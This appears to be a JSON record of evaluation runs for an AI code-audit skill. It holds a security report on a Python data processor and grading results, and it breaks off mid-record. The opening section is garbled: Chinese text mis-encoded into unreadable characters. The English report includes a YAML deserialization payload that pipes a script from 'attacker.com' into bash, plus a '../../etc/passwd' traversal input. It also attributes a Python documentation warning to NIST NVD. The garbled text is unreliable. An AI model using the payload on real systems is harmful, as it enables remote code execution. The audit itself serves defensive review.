\u9429\ufffd\u8930\u66de\u82df\u9352\u72bb\u6ace\u93b5\ufffd\u93c8\u590b\u6783\u6d60\u8bb9\u7d1d\u5a0c\u2103\u6e41\u6769\u56e8\u62a4\u9359\ufffd\u9352\u72bb\u6ace\u9477\ufffd\u5bb8\u535e\u57b1\u5be4\u8679\u6b91\u93c2\u56e6\u6b22\u9286\u509a\ufffd\u509b\u7049\u7487\u30e7\u6d30\u8930\u66da\u8151\u701b\u6a3a\u6e6a\u7ed7\ufe40\u5f7f\u95be\u70ac\u5e34\u93b4\u6827\u53fe\u6d60\u682c\u7e58\u7ecb\u5b2c\u6b91\u93c2\u56e6\u6b22\u951b\u5c7d\u5f72\u9473\u501f\ufffd\ufffd\u9352\u2543\u6564\u9286\ufffd\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef cleanup_temp_files():\n    \"\"\"Remove all temp files.\"\"\"\n    temp_dir = '/tmp/processor'\n    for f in os.listdir(temp_dir):\n        os.remove(os.path.join(temp_dir, f))\n```\n**\u690b\u5ea8\u6ad3**\u951b\u6c2c\ufffd\u509b\u7049\u93c0\u8bf2\u56ae\u9470\u5470\u5158\u6fb6\u71b7\u6e6a `/tmp/processor` \u6d93\ufffd\u9352\u6d98\u7f13\u7ed7\ufe40\u5f7f\u95be\u70ac\u5e34\u93b8\u56e7\u609c\u7eef\u8364\u7cba\u934f\u62bd\u656d\u93c2\u56e6\u6b22\u951b\u5b8dcleanup_temp_files()` \u9359\ufffd\u9473\u6212\u7d30\u95ab\u6c33\u7e43\u7ed7\ufe40\u5f7f\u95be\u70ac\u5e34\u74ba\u71bb\u91dc\u9352\u72bb\u6ace\u951b\u5772nlink\u951b\u5909\u6362\u93b0\u5fd4\u6783\u6d60\u8eb2\ufffd\u509a\u5f5f\u6fb6\u6835\u7d1d`os.listdir()` \u9366\u3129\u4eb6\u9358\u55da\u7e43\u7ecb\u5b29\u8151\u5a0c\u2103\u6e41\u6fb6\u52ed\u608a\u701b\u612e\u6d30\u8930\u66ea\u7d1d\u6fe1\u509b\u7049\u9429\ufffd\u8930\u66da\u8151\u935a\ufffd\u701b\u612e\u6d30\u8930\ufffd `os.remove()` \u6d7c\u6c2c\u3051\u7490\u30ef\u7d19\u95c8\u6b13\u7caf\u93c0\u6350\u7e43\u951b\u591b\u7d1d\u705e\u70b0\u7c2c\u934b\u30e5\uff0e\u93ac\u0447\u68f6\u68f0\u6a38\ufffd\ufffd\n**CWE**\u951b\u6b33WE-61 (UNIX Symbolic Link (Symlink) Following), CWE-459 (Incomplete Cleanup)\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport os\nimport tempfile\n\ndef cleanup_temp_files():\n    \"\"\"Remove only temp files created by this application.\"\"\"\n    temp_dir = '/tmp/processor'\n    for f in os.listdir(temp_dir):\n        full_path = os.path.join(temp_dir, f)\n        # Check for symlink and skip\n        if os.path.islink(full_path):\n            continue\n        if os.path.isfile(full_path):\n            os.remove(full_path)\n```\n\u93c7\u5b58\u5e39\u947d\u612a\u5a07\u9422\ufffd Python \u93cd\u56e7\u566f\u6434\ufffd `tempfile` \u59af\u2033\u6f61\u7ee0\uff04\u608a\u6d93\u5b58\u6902\u93c2\u56e6\u6b22\u9286\ufffd\n\n---\n\n## \u7039\u590a\u53cf\u7487\u52eb\u578e\n- **\u93ac\u8bf2\u578e**\u951b\ufffd100 - (3x25) - (2x15) - (3x8) - (1x3) = 100 - 75 - 30 - 24 - 3 = **-32** \u922b\ufffd \u93c8\ufffd\u6d63\u5ea1\u578e **0/100**\n- **\u7487\u52ed\u9a87**\u951b\ufffd**F**\n\n---\n\n## \u9352\u2543\u6564\u95be\u60e7\u578e\u93cb\ufffd\n\n\u7487\u30e8\u527c\u93c8\ufffd\u6d93\ufffd\u701b\u6a3a\u6e6a\u6d93\ufffd\u93c9\uffe0\u73ee\u9357\u535e\ufffd\u5d07\u6b91\u9352\u2543\u6564\u95be\u6485\u7d30\n\n1. **\u934f\u30e5\u5f5b**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546c\u7b02\u6d7c\u72b3\u4f13\u93b0\ufffd tar.gz \u9358\u5b2c\u7f09\u9356\u5483\u7d19\u95ab\u6c33\u7e43 `extract_archive()` \u9428\u52ee\u77fe\u5bf0\u52ef\u4eb6\u9358\u55d8\u7d21\u5a32\u70c7\u7d1a\n2. **\u93b8\u4f77\u7b99\u9356\ufffd**\u951b\u6c2c\u57c4\u9422\ufffd Zip Slip \u7455\u55d9\u6d0a `/var/data/processor/config.yml`\u951b\u5c7d\u6e6a\u934f\u6735\u8151\u5b93\u5c7d\u53c6 YAML \u9359\u5d85\u7c2d\u9352\u6940\u5bf2 payload\n3. **\u6d60\uff47\u721c\u93b5\u0446\ufffd\ufffd**\u951b\u6c2b\u7b05\u5a06\u00a4\u769f\u9422\ufffd `load_config()` \u93c3\u8bb9\u7d1d`yaml.load()` \u7459\ufe40\u5f42\u93ad\u8235\u5270\u6d60\uff47\u721c\u93b5\u0446\ufffd\u5c8b\u7d1d\u93c0\u8bf2\u56ae\u9470\u5470\u5e4f\u5bf0\u6941\u6e47\u9354\u2033\u6ad2\u93ba\u0443\u57d7\u93c9\ufffd\n4. **\u59af\ufffd\u935a\u6220\u0429\u9354\ufffd**\u951b\u6c36\ufffd\u6c33\u7e43 `API_TOKEN` \u7ead\ufffd\u7f02\u682b\u721c\u7035\u55db\u631c\u7481\u5757\u68f6\u934f\u6735\u7cac\u6e1a\u6fca\u7986\u935a\u5c7c\u7af4 Token \u9428\u52ec\u6e47\u9354\ufffd\n\n\u6769\u6b0e\u91dc\u7f01\u52eb\u608e\u6d63\u57ae\u7df1\u6d93\ufffd\u6d93\ufffd\u74ba\ufffd\u5bf0\u52ef\u4eb6\u9358\u55d8\u7d21\u5a32\u70b2\u5d0c\u7efe\u0442\u8d1f\u7039\u5c7e\u66a3\u9428\u52ee\u7e59\u7ecb\u5b29\u552c\u942e\u4f79\u58bd\u741b\u5c7e\u657e\u9351\u5a5a\u647c\u9286\ufffd\n\n---\n\n## \u6dc7\ufffd\u6fb6\u5d84\u7d2d\u934f\u5822\u9a87\u5be4\u9e3f\ufffd\ufffd\n\n| \u6d7c\u6a3a\u539b\u7efe\ufffd | \u95c2\ufffd\u68f0\ufffd | \u9358\u71b7\u6d1c |\n|--------|------|------|\n| P0 | \u7ead\ufffd\u7f02\u682b\u721c\u7035\u55db\u631c (CWE-798) | \u7ed4\u5b2a\u5d46\u675e\ufffd\u93b9\ufffd Token \u9a9e\u6735\u7ca0\u6d60\uff47\u721c\u6d93\ufffd\u7ec9\u5a5a\u6ace |\n| P0 | yaml.load() \u9359\u5d85\u7c2d\u9352\u6940\u5bf2 (CWE-502) | \u95b0\u5d85\u608e\u74ba\ufffd\u5bf0\u52ef\u4eb6\u9358\u55d7\u5f72\u7459\ufe40\u5f42 RCE |\n| P0 | pickle.load() \u9359\u5d85\u7c2d\u9352\u6940\u5bf2 (CWE-502) | \u9419\ufffd\u7ed4\u5b2a\u5d46\u9359\ufffd\u7459\ufe40\u5f42 RCE |\n| P1 | \u74ba\ufffd\u5bf0\u52ef\u4eb6\u9358\u55ed\u7d30extract_archive (CWE-22) | \u93c0\u8bf2\u56ae\u934f\u30e5\u5f5b\u9410\ufffd |\n| P1 | \u74ba\ufffd\u5bf0\u52ef\u4eb6\u9358\u55ed\u7d30process_file (CWE-22) | \u6d60\u7ed8\u5270\u93c2\u56e6\u6b22\u7487\u8bf2\u5f47 |\n| P2 | \u5bee\u535e\u7611\u942e\u4f78\u6431\u752f\ufffd MD5 (CWE-328) | \u7035\u55d9\u721c\u6434\u64b3\u7568\u934f\u3129\u68f6\u68f0\ufffd |\n| P2 | \u6d93\u5d85\u7568\u934f\u3126\u6783\u6d60\u8235\u6f48\u95c4\ufffd 0o777 (CWE-732) | \u93c1\u7248\u5d41\u7039\u5c7e\u66a3\u93ac\u0447\ufffd\u5ea8\u6ad3 |\n| P2 | \u5bee\u904d\u6ba2\u93c8\u70d8\u669f token (CWE-338) | \u97ec\ufffd\u6d60\u6212\u5409\u95ab\u72bb\ufffd\u5ea8\u6ad3 |\n| P3 | \u6d93\u5b58\u6902\u93c2\u56e6\u6b22\u93bf\u5d84\u7d94 (CWE-61) | \u6d63\u5ea2\u6f48\u95c4\u612a\u7b05\u9428\u52eb\u57c4\u9422\u3125\u6e80\u93c5\ufffd |\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u7684 yaml.load() \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Lines 59-78: dedicated yaml.load() deserialization finding"}, {"text": "\u62a5\u544a\u5305\u542b pickle.load() \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Lines 33-56: dedicated pickle.load() finding"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801 API_TOKEN \u53d1\u73b0", "passed": true, "evidence": "Lines 13-30: hardcoded API_TOKEN at line 14"}, {"text": "\u62a5\u544a\u5305\u542b MD5 \u5bc6\u7801\u54c8\u5e0c\u5f31\u70b9\u53d1\u73b0", "passed": true, "evidence": "Lines 147-174: MD5 hashing with fixed salt finding"}, {"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u968f\u673a\u6570\u751f\u6210\u53d1\u73b0\uff08random \u7528\u4e8e token\uff09", "passed": true, "evidence": "Lines 207-226: weak PRNG token generation finding"}, {"text": "\u62a5\u544a\u5305\u542b\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u53d1\u73b0\uff08process_file \u7684 os.path.join\uff09", "passed": true, "evidence": "Lines 115-142: path traversal in process_file finding"}, {"text": "\u62a5\u544a\u5305\u542b tarfile \u89e3\u538b\u904d\u5386\u98ce\u9669\u53d1\u73b0\uff08Zip Slip\uff09", "passed": true, "evidence": "Lines 82-112: Tar Slip in extract_archive finding"}, {"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u6743\u9650\u53d1\u73b0\uff08chmod 0o777\uff09", "passed": true, "evidence": "Lines 177-203: insecure file permissions chmod 0o777 finding"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u5177\u4f53\u7684\u4ee3\u7801\u4f4d\u7f6e\u548c\u884c\u53f7", "passed": true, "evidence": "Every finding includes case2_processor.py with specific line numbers"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "Every finding includes concrete fix code"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": true, "evidence": "Lines 263-264: Score 0/100, Rating F with calculation: 100 - 75 - 30 - 24 - 3"}], "summary": {"passed": 11, "failed": 0, "total": 11, "pass_rate": 1.0}}}, {"id": "data-processor-without_skill", "prompt": "I need a security audit on this Python data processor script at evals/files/case2_processor.py. Please produce a full security report.", "eval_id": 1, "outputs": [{"name": "audit_report.md", "type": "text", "content": "# Security Audit Report: case2_processor.py\n\n**File:** `D:\\code\\agent\\miko\\miko\\miko\\data\\skills\\code-audit\\evals\\files\\case2_processor.py`\n**Audit Date:** 2026-06-18\n**Severity Classification:**\n\n| Level | Description |\n|-------|-------------|\n| CRITICAL | Immediate exploitation risk, remote code execution, credential exposure |\n| HIGH | Significant data loss/leakage risk, requires non-trivial preconditions |\n| MEDIUM | Weakened security posture, defense-in-depth concerns |\n| LOW | Best-practice violations with limited direct exploitability |\n\n---\n\n## Executive Summary\n\nThis 84-line Python data processing script contains **11 distinct security vulnerabilities**, including **3 CRITICAL**, **4 HIGH**, **2 MEDIUM**, and **2 LOW** severity findings. The most severe issues include remote code execution via unsafe deserialization (YAML and Pickle), a hardcoded API token in source code, and a path traversal vulnerability in the file processing routine. The script is unsafe for production use in its current form.\n\n---\n\n## Finding 1: Hardcoded API Token in Source Code\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | CRITICAL |\n| **CWE** | CWE-798 (Use of Hard-coded Credentials) |\n| **Location** | Line 14 |\n| **Affected Code** | `API_TOKEN = 'sk-proj-abc123def456ghi789jkl'` |\n\n### Description\n\nA secret API token (`sk-proj-abc123def456ghi789jkl`) is hardcoded directly in the source code. This token is an OpenAI-style project API key. It is stored as a module-level constant and later assigned to `self.api_token` in the `DataProcessor.__init__` method (line 70).\n\n### Risk\n\n- Anyone with read access to the source code gains access to the API key.\n- The token will be committed to version control history (git).\n- The token is trivially discoverable via static analysis or even `grep`.\n- If this token is valid, an attacker could use it to consume API quota, access associated resources, or exfiltrate data -- all billed to the owner's account.\n- Token rotation requires a code change and redeployment.\n\n### Remediation\n\n```python\n# Use environment variables or a secrets manager\nimport os\nAPI_TOKEN = os.environ.get('API_TOKEN')\n```\n\nOr, better, use a dedicated secrets backend (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault). Never store secrets in source code. Rotate the exposed token immediately.\n\n---\n\n## Finding 2: Unsafe YAML Deserialization (Arbitrary Code Execution)\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | CRITICAL |\n| **CWE** | CWE-502 (Deserialization of Untrusted Data) |\n| **Location** | Line 20 |\n| **Affected Code** | `return yaml.load(f)` |\n\n### Description\n\nThe `load_config()` function calls `yaml.load(f)` without specifying a `Loader` argument. In PyYAML, when no `Loader` is provided, the default `Loader` class supports constructing arbitrary Python objects from specially crafted YAML input. This means an attacker who controls the contents of `/var/data/processor/config.yml` can achieve **arbitrary remote code execution**.\n\nA malicious YAML payload could look like:\n\n```yaml\n!!python/object/apply:os.system [\"curl http://attacker.com/shell.sh | bash\"]\n```\n\n### Risk\n\n- If an attacker can write to the configuration file (e.g., via another vulnerability, misconfiguration, or compromised upstream), they gain full code execution in the context of the Python process.\n- The resulting command runs with whatever privileges the Python process has, which could be root if the service is poorly configured.\n\n### Remediation\n\nUse `yaml.safe_load()` instead:\n\n```python\ndef load_config():\n    with open(CONFIG_FILE, 'r') as f:\n        return yaml.safe_load(f)\n```\n\n`safe_load()` only deserializes primitive Python types (dict, list, str, int, float, bool, None) and blocks arbitrary object construction.\n\n---\n\n## Finding 3: Unsafe Pickle Deserialization (Arbitrary Code Execution)\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | CRITICAL |\n| **CWE** | CWE-502 (Deserialization of Untrusted Data) |\n| **Location** | Line 26 |\n| **Affected Code** | `return pickle.load(f)` |\n\n### Description\n\nThe `load_state()` function deserializes a pickle file via `pickle.load()` without any validation or sandboxing. The Python pickle format allows the serialized data to include arbitrary Python code that executes upon deserialization. This is a well-known and well-documented remote code execution vector.\n\nAny process that can write a file to the path specified by `state_file` can craft a malicious pickle that executes arbitrary commands when the application calls `load_state()`.\n\n### Risk\n\n- **NIST NVD explicitly warns**: \"The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.\"\n- If an attacker can place a malicious `.pkl` file at the expected path, they gain arbitrary code execution.\n- Additionally, `save_state()` on line 31 uses `pickle.dump()` which, while not directly exploitable for RCE, perpetuates the unsafe storage format.\n\n### Remediation\n\n1. **Preferred:** Switch to a safe serialization format such as JSON:\n\n```python\nimport json\n\ndef load_state(state_file):\n    with open(state_file, 'r') as f:\n        return json.load(f)\n\ndef save_state(state, state_file):\n    with open(state_file, 'w') as f:\n        json.dump(state, f)\n```\n\n2. **If pickle is unavoidable:** Combine with cryptographic signing (HMAC) to ensure integrity and authenticity, and only unpickle data you yourself signed. Even then, prefer alternatives.\n\n---\n\n## Finding 4: Path Traversal in process_file()\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | HIGH |\n| **CWE** | CWE-22 (Path Traversal) |\n| **Location** | Lines 55-58 |\n| **Affected Code** | `filepath = os.path.join(DATA_DIR, filename)` |\n\n### Description\n\nThe `process_file()` function takes a `filename` argument and joins it with `DATA_DIR` using `os.path.join()`. If `filename` contains path traversal sequences (e.g., `../../etc/passwd`), `os.path.join()` will resolve the path above `DATA_DIR`, allowing an attacker to read arbitrary files on the filesystem.\n\nExample attack input: `filename = \"../../etc/passwd\"` produces `filepath = \"/var/data/processor/../../etc/passwd\"` which resolves to `/etc/passwd`.\n\n### Risk\n\n- **Information disclosure:** An attacker can read `/etc/passwd`, `/etc/shadow` (if the process runs as root), SSH private keys, application source code, or environment files containing secrets.\n- The content is returned in uppercase (line 58), but this is still trivially readable by reversing the case transformation.\n\n### Remediation\n\nValidate and sanitize the filename. Use `os.path.realpath()` to resolve and then verify the resolved path stays within the intended directory:\n\n```python\ndef process_file(filename):\n    filepath = os.path.realpath(os.path.join(DATA_DIR, filename))\n    if not filepath.startswith(os.path.realpath(DATA_DIR) + os.sep):\n        raise ValueError(\"Path traversal detected\")\n    with open(filepath, 'r') as f:\n        content = f.read()\n    return content.upper()\n```\n\nAlternatively, use `pathlib.Path.resolve()` with similar containment checks.\n\n---\n\n## Finding 5: Tar Slip / Zip Slip in extract_archive()\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | HIGH |\n| **CWE** | CWE-22 (Path Traversal via Archive Extraction) |\n| **Location** | Lines 38-39 |\n| **Affected Code** | `tar.extractall(path=dest_dir)` |\n\n### Description\n\nThe `extract_archive()` function calls `tarfile.extractall()` without any member path sanitization. Maliciously crafted tar archives can contain entries with absolute paths (e.g., `/etc/cron.d/backdoor`) or path traversal sequences (e.g., `../../.ssh/authorized_keys`). In older Python versions (prior to a fix), `extractall()` does not prevent extraction to paths outside the destination directory.\n\n### Risk\n\n- **Arbitrary file write:** An attacker who can upload or supply a malicious tar.gz archive can overwrite critical system files.\n- This can lead to privilege escalation (overwriting `authorized_keys`), persistence (writing cron jobs or systemd units), or code execution (overwriting Python modules or libraries).\n\n### Remediation\n\n1. **Use `extractall` with the `filter` argument** (Python 3.12+) or use `tarfile.data_filter`:\n\n```python\nwith tarfile.open(archive_path, 'r:gz') as tar:\n    tar.extractall(path=dest_dir, filter='data')\n```\n\n2. **For older Python versions**, manually iterate and validate each member:\n\n```python\nimport os\ndef extract_archive(archive_path, dest_dir=None):\n    if dest_dir is None:\n        dest_dir = DATA_DIR\n    dest_dir = os.path.realpath(dest_dir)\n    with tarfile.open(archive_path, 'r:gz') as tar:\n        for member in tar.getmembers():\n            # Reject absolute paths\n            if member.name.startswith('/'):\n                raise ValueError(f\"Absolute path in archive: {member.name}\")\n            # Reject traversal sequences\n            member_path = os.path.realpath(os.path.join(dest_dir, member.name))\n            if not member_path.startswith(dest_dir + os.sep):\n                raise ValueError(f\"Path traversal in archive: {member.name}\")\n            tar.extract(member, dest_dir)\n```\n\n---\n\n## Finding 6: Insecure File Permissions on Output\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | HIGH |\n| **CWE** | CWE-732 (Incorrect Permission Assignment for Critical Resource) |\n| **Location** | Line 77 |\n| **Affected Code** | `os.chmod(output_path, 0o777)` |\n\n### Description\n\nThe `DataProcessor.process()` method sets the output file permissions to `0o777` (world-readable, world-writable, world-executable). This means **any user on the system** can read, modify, or execute the output file.\n\n### Risk\n\n- **Data leakage:** Any local user can read the processed output, which may contain sensitive information.\n- **Integrity compromise:** Any local user can modify the output file, causing downstream consumers to process tampered data.\n- **Execution risk:** If the output file is later executed (e.g., as a script), any local user could have replaced it with malicious code.\n- This is a violation of the principle of least privilege.\n\n### Remediation\n\nUse restrictive permissions appropriate for the use case:\n\n```python\nos.chmod(output_path, 0o600)  # Owner read+write only\n# or\nos.chmod(output_path, 0o640)  # Owner read+write, group read\n```\n\nRemove the `chmod` call entirely if the default `umask` is correctly configured. The default file creation mask is preferable to an explicit `0o777`.\n\n---\n\n## Finding 7: Weak Password Hashing (MD5 + Fixed Salt)\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | HIGH |\n| **CWE** | CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-760 (Use of a One-Way Hash with a Predictable Salt) |\n| **Location** | Lines 42-45 |\n| **Affected Code** | `hashlib.md5((salt + password).encode()).hexdigest()` with `salt = 'fixed-salt-123'` |\n\n### Description\n\nThe `hash_password()` function has two critical weaknesses:\n\n1. **MD5 is cryptographically broken.** It is fast to compute (enabling brute-force attacks) and has known collision vulnerabilities. NIST deprecated MD5 for cryptographic use over a decade ago.\n\n2. **The salt is fixed and hardcoded.** A salt's purpose is to be unique per password so that identical passwords produce different hashes and pre-computed rainbow tables are defeated. A fixed, hardcoded salt defeats both purposes:\n   - Identical passwords produce identical hashes (revealing password reuse).\n   - An attacker can pre-compute a rainbow table for `fixed-salt-123` and crack all passwords at once.\n\n3. **No key stretching.** MD5 is a single-iteration hash with no work factor. Modern GPUs can compute billions of MD5 hashes per second, making brute-force attacks trivial.\n\n### Risk\n\n- Password hashes can be cracked in seconds using readily available GPU-based tools (hashcat, John the Ripper).\n- The fixed salt means one cracked password reveals all users with the same password.\n- The hardcoded salt in source code means the attacker knows the salt immediately upon compromising the codebase.\n\n### Remediation\n\nUse a dedicated password hashing library with key stretching:\n\n```python\nimport hashlib\nimport os\n\ndef hash_password(password):\n    salt = os.urandom(16)  # Cryptographically random, per-password salt\n    # Use PBKDF2 with 600,000+ iterations or preferably bcrypt/scrypt/argon2\n    dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000)\n    return salt.hex() + ':' + dk.hex()\n```\n\nBetter yet, use the `bcrypt` or `argon2-cffi` libraries which handle salt generation, key stretching, and constant-time comparison automatically:\n\n```python\nimport bcrypt\n\ndef hash_password(password):\n    return bcrypt.hashpw(password.encode(), bcrypt.gensalt())\n```\n\n---\n\n## Finding 8: Unvalidated Environment Variables / Path Assumptions\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | MEDIUM |\n| **CWE** | CWE-73 (External Control of File Name or Path) |\n| **Location** | Lines 12-13, 62-66 |\n| **Affected Code** | `DATA_DIR = '/var/data/processor'` (hardcoded), `temp_dir = '/tmp/processor'` (hardcoded) |\n\n### Description\n\nThe script assumes hardcoded directory paths exist and are correctly permissioned:\n\n- `DATA_DIR = '/var/data/processor'` -- no existence check, no permission check.\n- `temp_dir = '/tmp/processor'` -- no existence check.\n- `cleanup_temp_files()` iterates `os.listdir(temp_dir)` without checking if the directory exists (crashes if absent) and blindly removes all files in it (destructive if misconfigured).\n\nAdditionally, `cleanup_temp_files()` only removes the contents of `/tmp/processor`, not the directory itself, and has no safeguards against symlink attacks where a file inside `/tmp/processor` might actually be a symlink to a critical system file.\n\n### Risk\n\n- If the hardcoded paths are wrong or the directories don't exist, the script crashes with unhandled exceptions.\n- If `/tmp/processor` contains a symlink pointing to `/etc/passwd` or another critical file, `cleanup_temp_files()` will delete it (via `os.remove()` which follows symlinks).\n- No input validation on `state_file`, `archive_path`, `input_path`, or `output_path` -- all accept arbitrary paths.\n\n### Remediation\n\n- Create directories if they don't exist: `os.makedirs(DATA_DIR, exist_ok=True)`\n- Validate directory existence at startup.\n- For `cleanup_temp_files()`, resolve symlinks and verify the real path is within the intended temp directory before removing:\n\n```python\ndef cleanup_temp_files():\n    temp_dir = os.path.realpath('/tmp/processor')\n    if os.path.isdir(temp_dir):\n        for f in os.listdir(temp_dir):\n            fpath = os.path.realpath(os.path.join(temp_dir, f))\n            if fpath.startswith(temp_dir + os.sep):\n                os.remove(fpath)\n```\n\n---\n\n## Finding 9: Predictable \"Random\" Token\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | MEDIUM |\n| **CWE** | CWE-338 (Use of Cryptographically Weak Pseudo-Random Number Generator) |\n| **Location** | Lines 48-50 |\n| **Affected Code** | `''.join(random.choice('abcdef0123456789') for _ in range(32))` |\n\n### Description\n\nThe `generate_token()` function uses `random.choice()` from Python's `random` module. This module uses a **Mersenne Twister** PRNG, which is **not cryptographically secure**. Given enough output from the generator, an attacker can predict future (and past) outputs -- including API tokens.\n\nAdditionally, the character set only contains hexadecimal characters (`abcdef0123456789`), which means only 16 possible values per position. A 32-character hex token has 128 bits of nominal entropy, but combined with a predictable PRNG, this security is illusory.\n\n### Risk\n\n- An attacker who observes a few generated tokens can recover the internal state of the Mersenne Twister and predict all future tokens.\n- If the PRNG is seeded from system time (Python's default behavior), an attacker who knows approximately when the process started can brute-force the seed and reproduce all generated tokens.\n\n### Remediation\n\nUse `secrets` module for cryptographically secure token generation:\n\n```python\nimport secrets\n\ndef generate_token():\n    return secrets.token_hex(16)  # 32 hex characters, 128 bits of entropy\n```\n\n---\n\n## Finding 10: Unvalidated Input to process() Method\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | LOW |\n| **CWE** | CWE-20 (Improper Input Validation) |\n| **Location** | Lines 73-80 |\n| **Affected Code** | `DataProcessor.process()` accepts arbitrary `input_path` and `output_path` |\n\n### Description\n\nThe `DataProcessor.process()` method accepts arbitrary file paths for `input_path` and `output_path` with no validation. Combined with the `chmod`/`open` calls, this means:\n- An attacker can read any file on the system by passing its path as `input_path`.\n- An attacker can write to or overwrite any file by passing its path as `output_path`.\n- The file is then made world-readable/writable (see Finding 6).\n\nThe `_transform()` method does a simple string replacement (`'foo'` -> `'bar'`), so the data transformation itself is benign, but the unvalidated I/O is not.\n\n### Risk\n\nWhile less directly exploitable than `process_file()` (which has an explicit path traversal), this method still has no guardrails on file access.\n\n### Remediation\n\nValidate both paths to ensure they reside within the designated data directory, as described in Finding 4.\n\n---\n\n## Finding 11: Missing Exception Handling and Resource Management\n\n| Attribute | Detail |\n|-----------|--------|\n| **Severity** | LOW |\n| **CWE** | CWE-703 (Improper Check or Handling of Exceptional Conditions) |\n| **Location** | Entire file (all I/O operations) |\n| **Affected Code** | All `open()`, `os.listdir()`, `os.remove()`, `tarfile.open()` calls |\n\n### Description\n\nThroughout the script, file operations are performed without context managers (`with` is used for `open()` which is correct), but without any exception handling. If any I/O operation fails (file not found, permission denied, disk full), the script crashes with an unhandled exception and an unhelpful traceback.\n\nAdditionally, `cleanup_temp_files()` (lines 63-66) loops over `os.listdir()` results and calls `os.remove()` -- if a single removal fails (e.g., permission denied on one file), the entire loop aborts and remaining files are never cleaned up.\n\n### Risk\n\n- Service instability and potential DoS.\n- Incomplete cleanup on partial failure.\n- Information leakage via stack traces if exceptions are exposed to users/clients.\n\n### Remediation\n\nWrap individual file operations in try/except blocks with appropriate logging:\n\n```python\ndef cleanup_temp_files():\n    temp_dir = '/tmp/processor'\n    if not os.path.isdir(temp_dir):\n        return\n    for f in os.listdir(temp_dir):\n        try:\n            os.remove(os.path.join(temp_dir, f))\n        except OSError as e:\n            logging.warning(f\"Failed to remove {f}: {e}\")\n```\n\n---\n\n## Summary of Findings\n\n| # | Severity | Title | CWE | Line(s) |\n|---|----------|-------|-----|---------|\n| 1 | CRITICAL | Hardcoded API Token | CWE-798 | 14, 70 |\n| 2 | CRITICAL | Unsafe YAML Deserialization (RCE) | CWE-502 | 20 |\n| 3 | CRITICAL | Unsafe Pickle Deserialization (RCE) | CWE-502 | 26 |\n| 4 | HIGH | Path Traversal in process_file() | CWE-22 | 55-56 |\n| 5 | HIGH | Tar Slip in extract_archive() | CWE-22 | 38-39 |\n| 6 | HIGH | World-Writable File Permissions (0o777) | CWE-732 | 77 |\n| 7 | HIGH | Weak Password Hashing (MD5 + fixed salt) | CWE-327, CWE-760 | 42-45 |\n| 8 | MEDIUM | Hardcoded Paths / No Path Validation | CWE-73 | 12-13, 62-63 |\n| 9 | MEDIUM | Predictable Token Generation (insecure PRNG) | CWE-338 | 48-50 |\n| 10 | LOW | Unvalidated Input to process() | CWE-20 | 73-80 |\n| 11 | LOW | Missing Exception Handling | CWE-703 | Multiple |\n\n## Risk Matrix\n\n|   | Confidentiality | Integrity | Availability |\n|---|---|---|---|\n| **CRITICAL** | #1 (token leak) | #2, #3 (RCE via deserialization) | #2, #3 (RCE can DoS) |\n| **HIGH** | #4 (path traversal), #7 (MD5) | #5 (tar slip), #6 (0o777 perms) | #4 (read sensitive files) |\n| **MEDIUM** | #9 (token prediction) | #8 (TOCTOU/symlink) | #8 (crash on missing dir) |\n| **LOW** | #10 (unvalidated input) | #11 (unhandled errors) | #11 (incomplete cleanup) |\n\n## Overall Assessment\n\nThis script should **not be deployed in production** in its current state. While it is only 84 lines, it contains a high density of severe vulnerabilities. The three CRITICAL findings (hardcoded token, unsafe YAML, unsafe pickle) are each individually sufficient to compromise the host system. The recommended remediation for all findings is included above, but the minimum actions before any production use are:\n\n1. Remove the hardcoded API token and rotate it immediately.\n2. Replace `yaml.load()` with `yaml.safe_load()`.\n3. Replace `pickle.load()` with `json.load()` or add cryptographic integrity verification.\n4. Validate paths against path traversal in `process_file()` and `extract_archive()`.\n5. Remove the `os.chmod(output_path, 0o777)` call.\n6. Replace MD5 with bcrypt/argon2/PBKDF2 for password hashing.\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u7684 yaml.load() \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #2: Unsafe YAML Deserialization at line 20"}, {"text": "\u62a5\u544a\u5305\u542b pickle.load() \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #3: Unsafe Pickle Deserialization at line 26"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801 API_TOKEN \u53d1\u73b0", "passed": true, "evidence": "Finding #1: Hardcoded API Token at line 14"}, {"text": "\u62a5\u544a\u5305\u542b MD5 